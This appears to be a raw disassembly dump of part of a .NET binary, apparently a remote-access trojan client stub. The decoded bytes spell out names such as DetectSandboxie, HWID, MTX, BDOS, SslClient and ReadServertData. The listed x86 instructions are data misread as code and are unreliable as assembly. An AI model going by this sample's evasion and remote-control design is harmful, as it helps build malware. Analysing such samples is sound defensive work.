  4075b8:	49                   	dec    %ecx
  4075b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4075ba:	74 36                	je     0x4075f2
  4075bc:	34 00                	xor    $0x0,%al
  4075be:	54                   	push   %esp
  4075bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4075c0:	49                   	dec    %ecx
  4075c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4075c2:	74 36                	je     0x4075fa
  4075c4:	34 00                	xor    $0x0,%al
  4075c6:	53                   	push   %ebx
  4075c7:	77 61                	ja     0x40762a
  4075c9:	70 49                	jo     0x407614
  4075cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4075cc:	74 36                	je     0x407604
  4075ce:	34 00                	xor    $0x0,%al
  4075d0:	54                   	push   %esp
  4075d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4075d2:	55                   	push   %ebp
  4075d3:	49                   	dec    %ecx
  4075d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4075d5:	74 31                	je     0x407608
  4075d7:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  4075dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4075dd:	74 31                	je     0x407610
  4075df:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  4075e3:	61                   	popa
  4075e4:	70 49                	jo     0x40762f
  4075e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4075e7:	74 31                	je     0x40761a
  4075e9:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  4075ed:	41                   	inc    %ecx
  4075ee:	43                   	inc    %ebx
  4075ef:	53                   	push   %ebx
  4075f0:	48                   	dec    %eax
  4075f1:	41                   	inc    %ecx
  4075f2:	32 35 36 00 53 68    	xor    0x68530036,%dh
  4075f8:	61                   	popa
  4075f9:	32 35 36 00 41 65    	xor    0x65410036,%dh
  4075ff:	73 32                	jae    0x407633
  407601:	35 36 00 61 65       	xor    $0x65610036,%eax
  407606:	73 32                	jae    0x40763a
  407608:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  40760d:	53                   	push   %ebx
  40760e:	74 61                	je     0x407671
  407610:	74 69                	je     0x40767b
  407612:	63 41 72             	arpl   %eax,0x72(%ecx)
  407615:	72 61                	jb     0x407678
  407617:	79 49                	jns    0x407662
  407619:	6e                   	outsb  %ds:(%esi),(%dx)
  40761a:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  407621:	69 
  407622:	7a 65                	jp     0x407689
  407624:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  407629:	74 5f                	je     0x40768a
  40762b:	55                   	push   %ebp
  40762c:	54                   	push   %esp
  40762d:	46                   	inc    %esi
  40762e:	38 00                	cmp    %al,(%eax)
  407630:	3c 4d                	cmp    $0x4d,%al
  407632:	6f                   	outsl  %ds:(%esi),(%dx)
  407633:	64 75 6c             	fs jne 0x4076a2
  407636:	65 3e 00 3c 50       	gs add %bh,%ds:(%eax,%edx,2)
  40763b:	72 69                	jb     0x4076a6
  40763d:	76 61                	jbe    0x4076a0
  40763f:	74 65                	je     0x4076a6
  407641:	49                   	dec    %ecx
  407642:	6d                   	insl   (%dx),%es:(%edi)
  407643:	70 6c                	jo     0x4076b1
  407645:	65 6d                	gs insl (%dx),%es:(%edi)
  407647:	65 6e                	outsb  %gs:(%esi),(%dx)
  407649:	74 61                	je     0x4076ac
  40764b:	74 69                	je     0x4076b6
  40764d:	6f                   	outsl  %ds:(%esi),(%dx)
  40764e:	6e                   	outsb  %ds:(%esi),(%dx)
  40764f:	44                   	inc    %esp
  407650:	65 74 61             	gs je  0x4076b4
  407653:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  40765a:	42 
  40765b:	32 41 31             	xor    0x31(%ecx),%al
  40765e:	46                   	inc    %esi
  40765f:	39 39                	cmp    %edi,(%ecx)
  407661:	30 32                	xor    %dh,(%edx)
  407663:	42                   	inc    %edx
  407664:	33 35 46 38 46 38    	xor    0x38463846,%esi
  40766a:	38 30                	cmp    %dh,(%eax)
  40766c:	45                   	inc    %ebp
  40766d:	46                   	inc    %esi
  40766e:	31 36                	xor    %esi,(%esi)
  407670:	39 32                	cmp    %esi,(%edx)
  407672:	43                   	inc    %ebx
  407673:	45                   	inc    %ebp
  407674:	39 39                	cmp    %edi,(%ecx)
  407676:	34 37                	xor    $0x37,%al
  407678:	41                   	inc    %ecx
  407679:	31 39                	xor    %edi,(%ecx)
  40767b:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  40767f:	36 39 38             	cmp    %edi,%ss:(%eax)
  407682:	44                   	inc    %esp
  407683:	38 46 35             	cmp    %al,0x35(%esi)
  407686:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  40768a:	41                   	inc    %ecx
  40768b:	37                   	aaa
  40768c:	32 31                	xor    (%ecx),%dh
  40768e:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  407694:	43                   	inc    %ebx
  407695:	35 38 42 00 47       	xor    $0x47004238,%eax
  40769a:	43                   	inc    %ebx
  40769b:	00 45 53             	add    %al,0x53(%ebp)
  40769e:	5f                   	pop    %edi
  40769f:	53                   	push   %ebx
  4076a0:	59                   	pop    %ecx
  4076a1:	53                   	push   %ebx
  4076a2:	54                   	push   %esp
  4076a3:	45                   	inc    %ebp
  4076a4:	4d                   	dec    %ebp
  4076a5:	5f                   	pop    %edi
  4076a6:	52                   	push   %edx
  4076a7:	45                   	inc    %ebp
  4076a8:	51                   	push   %ecx
  4076a9:	55                   	push   %ebp
  4076aa:	49                   	dec    %ecx
  4076ab:	52                   	push   %edx
  4076ac:	45                   	inc    %ebp
  4076ad:	44                   	inc    %esp
  4076ae:	00 45 53             	add    %al,0x53(%ebp)
  4076b1:	5f                   	pop    %edi
  4076b2:	44                   	inc    %esp
  4076b3:	49                   	dec    %ecx
  4076b4:	53                   	push   %ebx
  4076b5:	50                   	push   %eax
  4076b6:	4c                   	dec    %esp
  4076b7:	41                   	inc    %ecx
  4076b8:	59                   	pop    %ecx
  4076b9:	5f                   	pop    %edi
  4076ba:	52                   	push   %edx
  4076bb:	45                   	inc    %ebp
  4076bc:	51                   	push   %ecx
  4076bd:	55                   	push   %ebp
  4076be:	49                   	dec    %ecx
  4076bf:	52                   	push   %edx
  4076c0:	45                   	inc    %ebp
  4076c1:	44                   	inc    %esp
  4076c2:	00 4d 61             	add    %cl,0x61(%ebp)
  4076c5:	70 4e                	jo     0x407715
  4076c7:	61                   	popa
  4076c8:	6d                   	insl   (%dx),%es:(%edi)
  4076c9:	65 54                	gs push %esp
  4076cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4076cc:	4f                   	dec    %edi
  4076cd:	49                   	dec    %ecx
  4076ce:	44                   	inc    %esp
  4076cf:	00 48 57             	add    %cl,0x57(%eax)
  4076d2:	49                   	dec    %ecx
  4076d3:	44                   	inc    %esp
  4076d4:	00 67 65             	add    %ah,0x65(%edi)
  4076d7:	74 5f                	je     0x407738
  4076d9:	46                   	inc    %esi
  4076da:	6f                   	outsl  %ds:(%esi),(%dx)
  4076db:	72 6d                	jb     0x40774a
  4076dd:	61                   	popa
  4076de:	74 49                	je     0x407729
  4076e0:	44                   	inc    %esp
  4076e1:	00 45 58             	add    %al,0x58(%ebp)
  4076e4:	45                   	inc    %ebp
  4076e5:	43                   	inc    %ebx
  4076e6:	55                   	push   %ebp
  4076e7:	54                   	push   %esp
  4076e8:	49                   	dec    %ecx
  4076e9:	4f                   	dec    %edi
  4076ea:	4e                   	dec    %esi
  4076eb:	5f                   	pop    %edi
  4076ec:	53                   	push   %ebx
  4076ed:	54                   	push   %esp
  4076ee:	41                   	inc    %ecx
  4076ef:	54                   	push   %esp
  4076f0:	45                   	inc    %ebp
  4076f1:	00 38                	add    %bh,(%eax)
  4076f3:	37                   	aaa
  4076f4:	36 33 39             	xor    %ss:(%ecx),%edi
  4076f7:	31 32                	xor    %esi,(%edx)
  4076f9:	36 45                	ss inc %ebp
  4076fb:	41                   	inc    %ecx
  4076fc:	37                   	aaa
  4076fd:	37                   	aaa
  4076fe:	42                   	inc    %edx
  4076ff:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407705:	35 33 32 33 36       	xor    $0x36333233,%eax
  40770a:	37                   	aaa
  40770b:	44                   	inc    %esp
  40770c:	42                   	inc    %edx
  40770d:	41                   	inc    %ecx
  40770e:	36 37                	ss aaa
  407710:	43                   	inc    %ebx
  407711:	35 33 31 30 45       	xor    $0x45303133,%eax
  407716:	46                   	inc    %esi
  407717:	35 30 41 38 44       	xor    $0x44384130,%eax
  40771c:	39 38                	cmp    %edi,(%eax)
  40771e:	38 38                	cmp    %bh,(%eax)
  407720:	45                   	inc    %ebp
  407721:	44                   	inc    %esp
  407722:	30 37                	xor    %dh,(%edi)
  407724:	30 43 44             	xor    %al,0x44(%ebx)
  407727:	34 30                	xor    $0x30,%al
  407729:	45                   	inc    %ebp
  40772a:	31 46 36             	xor    %eax,0x36(%esi)
  40772d:	30 35 41 38 46 00    	xor    %dh,0x463841
  407733:	67 65 74 5f          	addr16 gs je 0x407796
  407737:	41                   	inc    %ecx
  407738:	53                   	push   %ebx
  407739:	43                   	inc    %ebx
  40773a:	49                   	dec    %ecx
  40773b:	49                   	dec    %ecx
  40773c:	00 53 79             	add    %dl,0x79(%ebx)
  40773f:	73 74                	jae    0x4077b5
  407741:	65 6d                	gs insl (%dx),%es:(%edi)
  407743:	2e 49                	cs dec %ecx
  407745:	4f                   	dec    %edi
  407746:	00 49 73             	add    %cl,0x73(%ecx)
  407749:	58                   	pop    %eax
  40774a:	50                   	push   %eax
  40774b:	00 42 44             	add    %al,0x44(%edx)
  40774e:	4f                   	dec    %edi
  40774f:	53                   	push   %ebx
  407750:	00 45 53             	add    %al,0x53(%ebp)
  407753:	5f                   	pop    %edi
  407754:	43                   	inc    %ebx
  407755:	4f                   	dec    %edi
  407756:	4e                   	dec    %esi
  407757:	54                   	push   %esp
  407758:	49                   	dec    %ecx
  407759:	4e                   	dec    %esi
  40775a:	55                   	push   %ebp
  40775b:	4f                   	dec    %edi
  40775c:	55                   	push   %ebp
  40775d:	53                   	push   %ebx
  40775e:	00 67 65             	add    %ah,0x65(%edi)
  407761:	74 5f                	je     0x4077c2
  407763:	49                   	dec    %ecx
  407764:	56                   	push   %esi
  407765:	00 73 65             	add    %dh,0x65(%ebx)
  407768:	74 5f                	je     0x4077c9
  40776a:	49                   	dec    %ecx
  40776b:	56                   	push   %esi
  40776c:	00 47 65             	add    %al,0x65(%edi)
  40776f:	6e                   	outsb  %ds:(%esi),(%dx)
  407770:	65 72 61             	gs jb  0x4077d4
  407773:	74 65                	je     0x4077da
  407775:	49                   	dec    %ecx
  407776:	56                   	push   %esi
  407777:	00 4d 54             	add    %cl,0x54(%ebp)
  40777a:	58                   	pop    %eax
  40777b:	00 76 61             	add    %dh,0x61(%esi)
  40777e:	6c                   	insb   (%dx),%es:(%edi)
  40777f:	75 65                	jne    0x4077e6
  407781:	5f                   	pop    %edi
  407782:	5f                   	pop    %edi
  407783:	00 52 65             	add    %dl,0x65(%edx)
  407786:	61                   	popa
  407787:	64 53                	fs push %ebx
  407789:	65 72 76             	gs jb  0x407802
  40778c:	65 72 74             	gs jb  0x407803
  40778f:	44                   	inc    %esp
  407790:	61                   	popa
  407791:	74 61                	je     0x4077f4
  407793:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407797:	61                   	popa
  407798:	00 6d 73             	add    %ch,0x73(%ebp)
  40779b:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40779e:	6c                   	insb   (%dx),%es:(%edi)
  40779f:	69 62 00 53 74 75 62 	imul   $0x62757453,0x0(%edx),%esp
  4077a6:	00 53 79             	add    %dl,0x79(%ebx)
  4077a9:	73 74                	jae    0x40781f
  4077ab:	65 6d                	gs insl (%dx),%es:(%edi)
  4077ad:	2e 43                	cs inc %ebx
  4077af:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b0:	6c                   	insb   (%dx),%es:(%edi)
  4077b1:	6c                   	insb   (%dx),%es:(%edi)
  4077b2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4077b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4077b8:	73 2e                	jae    0x4077e8
  4077ba:	47                   	inc    %edi
  4077bb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4077bd:	65 72 69             	gs jb  0x407829
  4077c0:	63 00                	arpl   %eax,(%eax)
  4077c2:	4d                   	dec    %ebp
  4077c3:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4077ca:	74 2e                	je     0x4077fa
  4077cc:	56                   	push   %esi
  4077cd:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4077d4:	73 69                	jae    0x40783f
  4077d6:	63 00                	arpl   %eax,(%eax)
  4077d8:	67 65 74 5f          	addr16 gs je 0x40783b
  4077dc:	53                   	push   %ebx
  4077dd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4077df:	64 53                	fs push %ebx
  4077e1:	79 6e                	jns    0x407851
  4077e3:	63 00                	arpl   %eax,(%eax)
  4077e5:	67 65 74 5f          	addr16 gs je 0x407848
  4077e9:	49                   	dec    %ecx
  4077ea:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  4077ee:	64 52                	fs push %edx
  4077f0:	65 61                	gs popa
  4077f2:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  4077f6:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  4077fd:	00 
  4077fe:	54                   	push   %esp
  4077ff:	68 72 65 61 64       	push   $0x64616572
  407804:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407808:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  40780c:	6e                   	outsb  %ds:(%esi),(%dx)
  40780d:	65 72 41             	gs jb  0x407851
  407810:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407815:	41                   	inc    %ecx
  407816:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  40781c:	61                   	popa
  40781d:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407823:	74 5f                	je     0x407884
  407825:	43                   	inc    %ebx
  407826:	6f                   	outsl  %ds:(%esi),(%dx)
  407827:	6e                   	outsb  %ds:(%esi),(%dx)
  407828:	6e                   	outsb  %ds:(%esi),(%dx)
  407829:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40782e:	00 67 65             	add    %ah,0x65(%edi)
  407831:	74 5f                	je     0x407892
  407833:	49                   	dec    %ecx
  407834:	73 43                	jae    0x407879
  407836:	6f                   	outsl  %ds:(%esi),(%dx)
  407837:	6e                   	outsb  %ds:(%esi),(%dx)
  407838:	6e                   	outsb  %ds:(%esi),(%dx)
  407839:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40783e:	00 73 65             	add    %dh,0x65(%ebx)
  407841:	74 5f                	je     0x4078a2
  407843:	49                   	dec    %ecx
  407844:	73 43                	jae    0x407889
  407846:	6f                   	outsl  %ds:(%esi),(%dx)
  407847:	6e                   	outsb  %ds:(%esi),(%dx)
  407848:	6e                   	outsb  %ds:(%esi),(%dx)
  407849:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40784e:	00 52 65             	add    %dl,0x65(%edx)
  407851:	63 65 69             	arpl   %esp,0x69(%ebp)
  407854:	76 65                	jbe    0x4078bb
  407856:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40785a:	74 5f                	je     0x4078bb
  40785c:	47                   	inc    %edi
  40785d:	75 69                	jne    0x4078c8
  40785f:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407863:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  40786a:	64 
  40786b:	53                   	push   %ebx
  40786c:	79 6e                	jns    0x4078dc
  40786e:	63 3e                	arpl   %edi,(%esi)
  407870:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407874:	61                   	popa
  407875:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407878:	6e                   	outsb  %ds:(%esi),(%dx)
  407879:	67 46                	addr16 inc %esi
  40787b:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407882:	73 43                	jae    0x4078c7
  407884:	6f                   	outsl  %ds:(%esi),(%dx)
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	6e                   	outsb  %ds:(%esi),(%dx)
  407887:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  40788c:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407891:	61                   	popa
  407892:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407895:	6e                   	outsb  %ds:(%esi),(%dx)
  407896:	67 46                	addr16 inc %esi
  407898:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  40789f:	65 65 70 41          	gs gs jo 0x4078e4
  4078a3:	6c                   	insb   (%dx),%es:(%edi)
  4078a4:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  4078ab:	42                   	inc    %edx
  4078ac:	61                   	popa
  4078ad:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4078b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4078b1:	67 46                	addr16 inc %esi
  4078b3:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  4078ba:	65 61                	gs popa
  4078bc:	64 65 72 53          	fs gs jb 0x407913
  4078c0:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  4078c7:	42                   	inc    %edx
  4078c8:	61                   	popa
  4078c9:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4078cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4078cd:	67 46                	addr16 inc %esi
  4078cf:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  4078d6:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  4078dd:	42                   	inc    %edx
  4078de:	61                   	popa
  4078df:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4078e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e3:	67 46                	addr16 inc %esi
  4078e5:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  4078ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ed:	74 65                	je     0x407954
  4078ef:	72 76                	jb     0x407967
  4078f1:	61                   	popa
  4078f2:	6c                   	insb   (%dx),%es:(%edi)
  4078f3:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  4078f8:	61                   	popa
  4078f9:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4078fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4078fd:	67 46                	addr16 inc %esi
  4078ff:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407906:	75 66                	jne    0x40796e
  407908:	66 65 72 3e          	data16 gs jb 0x40794a
  40790c:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407910:	61                   	popa
  407911:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407914:	6e                   	outsb  %ds:(%esi),(%dx)
  407915:	67 46                	addr16 inc %esi
  407917:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  40791e:	66 66 73 65          	data16 data16 jae 0x407987
  407922:	74 3e                	je     0x407962
  407924:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407928:	61                   	popa
  407929:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40792c:	6e                   	outsb  %ds:(%esi),(%dx)
  40792d:	67 46                	addr16 inc %esi
  40792f:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407936:	73 6c                	jae    0x4079a4
  407938:	43                   	inc    %ebx
  407939:	6c                   	insb   (%dx),%es:(%edi)
  40793a:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407941:	5f                   	pop    %edi
  407942:	42                   	inc    %edx
  407943:	61                   	popa
  407944:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407947:	6e                   	outsb  %ds:(%esi),(%dx)
  407948:	67 46                	addr16 inc %esi
  40794a:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407951:	63 70 43             	arpl   %esi,0x43(%eax)
  407954:	6c                   	insb   (%dx),%es:(%edi)
  407955:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  40795c:	5f                   	pop    %edi
  40795d:	42                   	inc    %edx
  40795e:	61                   	popa
  40795f:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407962:	6e                   	outsb  %ds:(%esi),(%dx)
  407963:	67 46                	addr16 inc %esi
  407965:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  40796c:	6e                   	outsb  %ds:(%esi),(%dx)
  40796d:	65 72 41             	gs jb  0x4079b1
  407970:	64 64 4d             	fs fs dec %ebp
  407973:	61                   	popa
  407974:	70 43                	jo     0x4079b9
  407976:	68 69 6c 64 00       	push   $0x646c69
  40797b:	49                   	dec    %ecx
  40797c:	6e                   	outsb  %ds:(%esi),(%dx)
  40797d:	6e                   	outsb  %ds:(%esi),(%dx)
  40797e:	65 72 41             	gs jb  0x4079c2
  407981:	64 64 41             	fs fs inc %ecx
  407984:	72 72                	jb     0x4079f8
  407986:	61                   	popa
  407987:	79 43                	jns    0x4079cc
  407989:	68 69 6c 64 00       	push   $0x646c69
  40798e:	53                   	push   %ebx
  40798f:	65 6e                	outsb  %gs:(%esi),(%dx)
  407991:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407995:	70 65                	jo     0x4079fc
  407997:	6e                   	outsb  %ds:(%esi),(%dx)
  407998:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  40799c:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  4079a3:	61 
  4079a4:	6c                   	insb   (%dx),%es:(%edi)
  4079a5:	75 65                	jne    0x407a0c
  4079a7:	4b                   	dec    %ebx
  4079a8:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  4079af:	6c                   	insb   (%dx),%es:(%edi)
  4079b0:	61                   	popa
  4079b1:	63 65 00             	arpl   %esp,0x0(%ebp)
  4079b4:	43                   	inc    %ebx
  4079b5:	72 65                	jb     0x407a1c
  4079b7:	61                   	popa
  4079b8:	74 65                	je     0x407a1f
  4079ba:	49                   	dec    %ecx
  4079bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4079bc:	73 74                	jae    0x407a32
  4079be:	61                   	popa
  4079bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4079c0:	63 65 00             	arpl   %esp,0x0(%ebp)
  4079c3:	73 65                	jae    0x407a2a
  4079c5:	74 5f                	je     0x407a26
  4079c7:	4d                   	dec    %ebp
  4079c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4079c9:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  4079ce:	6c                   	insb   (%dx),%es:(%edi)
  4079cf:	65 4d                	gs dec %ebp
  4079d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4079d2:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  4079d7:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  4079de:	64 65 
  4079e0:	00 45 6e             	add    %al,0x6e(%ebp)
  4079e3:	74 65                	je     0x407a4a
  4079e5:	72 44                	jb     0x407a2b
  4079e7:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4079eb:	4d                   	dec    %ebp
  4079ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ed:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  4079f2:	79 70                	jns    0x407a64
  4079f4:	74 6f                	je     0x407a65
  4079f6:	53                   	push   %ebx
  4079f7:	74 72                	je     0x407a6b
  4079f9:	65 61                	gs popa
  4079fb:	6d                   	insl   (%dx),%es:(%edi)
  4079fc:	4d                   	dec    %ebp
  4079fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4079fe:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407a03:	6d                   	insl   (%dx),%es:(%edi)
  407a04:	70 72                	jo     0x407a78
  407a06:	65 73 73             	gs jae 0x407a7c
  407a09:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407a10:	00 43 69             	add    %al,0x69(%ebx)
  407a13:	70 68                	jo     0x407a7d
  407a15:	65 72 4d             	gs jb  0x407a65
  407a18:	6f                   	outsl  %ds:(%esi),(%dx)
  407a19:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407a1e:	6c                   	insb   (%dx),%es:(%edi)
  407a1f:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407a24:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407a29:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407a2d:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407a30:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407a35:	65 74 65             	gs je  0x407a9d
  407a38:	53                   	push   %ebx
  407a39:	75 62                	jne    0x407a9d
  407a3b:	4b                   	dec    %ebx
  407a3c:	65 79 54             	gs jns 0x407a93
  407a3f:	72 65                	jb     0x407aa6
  407a41:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407a45:	74 5f                	je     0x407aa6
  407a47:	4d                   	dec    %ebp
  407a48:	65 73 73             	gs jae 0x407abe
  407a4b:	61                   	popa
  407a4c:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407a51:	74 65                	je     0x407ab8
  407a53:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407a57:	6e                   	outsb  %ds:(%esi),(%dx)
  407a58:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407a5c:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407a63:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407a67:	45                   	inc    %ebp
  407a68:	6e                   	outsb  %ds:(%esi),(%dx)
  407a69:	75 6d                	jne    0x407ad8
  407a6b:	65 72 61             	gs jb  0x407acf
  407a6e:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407a72:	49                   	dec    %ecx
  407a73:	44                   	inc    %esp
  407a74:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407a7b:	6c                   	insb   (%dx),%es:(%edi)
  407a7c:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407a81:	6f                   	outsl  %ds:(%esi),(%dx)
  407a82:	75 62                	jne    0x407ae6
  407a84:	6c                   	insb   (%dx),%es:(%edi)
  407a85:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407a89:	61                   	popa
  407a8a:	70 44                	jo     0x407ad0
  407a8c:	6f                   	outsl  %ds:(%esi),(%dx)
  407a8d:	75 62                	jne    0x407af1
  407a8f:	6c                   	insb   (%dx),%es:(%edi)
  407a90:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407a94:	74 5f                	je     0x407af5
  407a96:	48                   	dec    %eax
  407a97:	61                   	popa
  407a98:	6e                   	outsb  %ds:(%esi),(%dx)
  407a99:	64 6c                	fs insb (%dx),%es:(%edi)
  407a9b:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407a9f:	6e                   	outsb  %ds:(%esi),(%dx)
  407aa0:	74 69                	je     0x407b0b
  407aa2:	6d                   	insl   (%dx),%es:(%edi)
  407aa3:	65 46                	gs inc %esi
  407aa5:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407aac:	64 6c                	fs insb (%dx),%es:(%edi)
  407aae:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407ab2:	74 4d                	je     0x407b01
  407ab4:	6f                   	outsl  %ds:(%esi),(%dx)
  407ab5:	64 75 6c             	fs jne 0x407b24
  407ab8:	65 48                	gs dec %eax
  407aba:	61                   	popa
  407abb:	6e                   	outsb  %ds:(%esi),(%dx)
  407abc:	64 6c                	fs insb (%dx),%es:(%edi)
  407abe:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407ac2:	6e                   	outsb  %ds:(%esi),(%dx)
  407ac3:	74 69                	je     0x407b2e
  407ac5:	6d                   	insl   (%dx),%es:(%edi)
  407ac6:	65 54                	gs push %esp
  407ac8:	79 70                	jns    0x407b3a
  407aca:	65 48                	gs dec %eax
  407acc:	61                   	popa
  407acd:	6e                   	outsb  %ds:(%esi),(%dx)
  407ace:	64 6c                	fs insb (%dx),%es:(%edi)
  407ad0:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407ad4:	74 54                	je     0x407b2a
  407ad6:	79 70                	jns    0x407b48
  407ad8:	65 46                	gs inc %esi
  407ada:	72 6f                	jb     0x407b4b
  407adc:	6d                   	insl   (%dx),%es:(%edi)
  407add:	48                   	dec    %eax
  407ade:	61                   	popa
  407adf:	6e                   	outsb  %ds:(%esi),(%dx)
